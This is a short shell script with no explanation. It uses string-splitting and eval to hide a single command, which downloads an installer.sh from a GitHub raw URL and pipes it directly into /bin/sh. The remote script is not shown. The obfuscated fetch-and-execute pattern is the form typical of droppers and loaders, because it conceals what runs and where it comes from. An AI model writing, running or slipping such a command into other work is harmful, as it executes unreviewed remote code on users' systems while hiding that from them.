z="
";Uz='- | ';Oz='r/ma';Cz='ps:/';Pz='in/i';Sz='.sh ';Iz='nt.c';Wz='/sh';Rz='ller';Ez='.git';Hz='onte';Tz='-qO ';Dz='/raw';Mz='rees';Az='wget';Gz='serc';Fz='hubu';Qz='nsta';Bz=' htt';Lz='37/f';Jz='om/e';Vz='/bin';Kz='mil2';Nz='erve';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"